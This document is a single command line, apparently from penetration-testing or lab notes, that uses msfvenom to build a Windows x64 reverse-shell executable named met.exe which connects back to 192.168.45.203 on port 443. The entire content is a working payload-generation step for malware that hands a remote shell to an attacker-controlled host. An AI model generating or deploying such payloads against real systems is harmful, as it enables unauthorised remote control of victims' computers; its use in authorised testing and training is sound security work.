```
msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.45.203 lport=443 -f exe -o met.exe
```